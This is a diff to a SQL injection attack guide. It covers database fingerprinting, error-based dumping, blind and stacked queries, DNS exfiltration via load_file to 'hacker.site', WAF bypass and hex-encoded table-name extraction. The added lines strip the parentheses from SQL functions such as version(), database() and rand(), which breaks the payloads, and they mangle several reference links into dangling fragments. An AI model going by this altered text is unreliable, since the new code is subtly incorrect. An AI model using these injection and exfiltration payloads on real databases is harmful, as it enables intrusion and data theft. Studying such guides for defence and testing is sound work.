@@ -190,11 +190,11 @@ In some cases the **sleep functions won't be allowed**. Then, instead of using t
 
 ### Identifying Back-end
 
-The best way to identify the back-end is trying to execute functions of the different back-ends. You could use the _**sleep**_ **functions** of the previous section or these ones (table from [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):<sup>[[1]](#references)</sup>
+The best way to identify the back-end is trying to execute functions of the different back-ends. You could use the _**sleep**_ **functions** of the previous section or these ones (table from [this collection]:<sup>[[1]](#references)</sup>
 
 ```bash
 ["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
-["connection_id()=connection_id()"                 ,"MYSQL"],
+["connection_id=connection_id"                 ,"MYSQL"],
 ["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
 ["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
 ["@@CONNECTIONS>0"                                 ,"MSSQL"],
@@ -206,13 +206,13 @@ The best way to identify the back-end is trying to execute functions of the diff
 ["LNNVL(0=123)"                                    ,"ORACLE"],
 ["5::int=5"                                        ,"POSTGRESQL"],
 ["5::integer=5"                                    ,"POSTGRESQL"],
-["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
-["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
+["pg_client_encoding=pg_client_encoding"       ,"POSTGRESQL"],
+["get_current_ts_config=get_current_ts_config" ,"POSTGRESQL"],
 ["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
-["current_database()=current_database()"           ,"POSTGRESQL"],
-["sqlite_version()=sqlite_version()"               ,"SQLITE"],
-["last_insert_rowid()>1"                           ,"SQLITE"],
-["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
+["current_database=current_database"           ,"POSTGRESQL"],
+["sqlite_version=sqlite_version"               ,"SQLITE"],
+["last_insert_rowid>1"                           ,"SQLITE"],
+["last_insert_rowid=last_insert_rowid"         ,"SQLITE"],
 ["val(cvar(1))=1"                                  ,"MSACCESS"],
 ["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
 ["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
@@ -303,7 +303,7 @@ If for some reason you **cannot** see the **output** of the **query** but you ca
 Following a similar flow as in the Union Based exploitation you could manage to dump the DB.
 
 ```sql
-(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand*2))x from (select 1 union select 2)a group by x limit 1))
 ```
 
 ## Exploiting Blind SQLi
@@ -342,7 +342,7 @@ You can use stacked queries to **execute multiple queries in succession**. Note 
 If **no-other** exploitation method **worked**, you may try to make the **database ex-filtrate** the info to an **external host** controlled by you. For example, via DNS queries:
 
 ```sql
-select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
+select load_file(concat('\\\\',version,'.hacker.site\\a.txt'));
 ```
 
 ### Out of band data exfiltration via XXE
@@ -365,7 +365,7 @@ The preceding sections cover generic SQL injection exploitation. The following p
 - Oracle
 - PostgreSQL
 
-Or you will find **a lot of tricks regarding: MySQL, PostgreSQL, Oracle, MSSQL, SQLite and HQL in** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)<sup>[[1]](#references)</sup>
+Or you will find **a lot of tricks regarding: MySQL, PostgreSQL, Oracle, MSSQL, SQLite and HQL in** [**)<sup>[[1]](#references)</sup>
 
 ## Authentication bypass
 
@@ -493,7 +493,7 @@ With this technique you can extract information creating only 1 account. It is i
 Using **hex2dec** and **substr**:
 
 ```sql
-'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
+'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database ORDER BY table_name ASC limit 0,1)+'
 ```
 
 To get the text you can use:
@@ -505,12 +505,12 @@ __import__('binascii').unhexlify(hex(215573607263)[2:])
 Using **hex** and **replace** (and **substr**):
 
 ```sql
-'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
+'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database ORDER BY table_name ASC limit 0,1)+'
 
-'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
+'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database ORDER BY table_name ASC limit 0,1)+'
 
 #Full ascii uppercase and lowercase replace:
-'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
+'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database ORDER BY table_name ASC limit 0,1)+'
 ```
 
 ## Routed SQL injection
@@ -580,7 +580,7 @@ AND   -> && -> %26%26
 OR    -> || -> %7C%7C
 =     -> LIKE,REGEXP,RLIKE, not < and not >
 > X   -> not between 0 and X
-WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
+WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database)Then(table_name)END) -> group_concat(if(table_schema=database,table_name,null))
 ```
 
 ### Scientific Notation WAF bypass
@@ -715,16 +715,16 @@ https://github.com/m4ll0k/Atlas
 ## Other Guides
 
 - [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)<sup>[[1]](#references)</sup>
+- [)<sup>[[1]](#references)</sup>
 
 ## Brute-Force Detection List
 
 
-https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt
+
 
 ## References
 
-- [1] [PayloadsAllTheThings – SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+- [1] [this collection – SQL Injection]
 - [2] [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f)
 - [3] [SQL Truncation Attack (Lucideus)](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html)
 - [4] [SQL Truncation Attack (InfoSec Institute)](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)
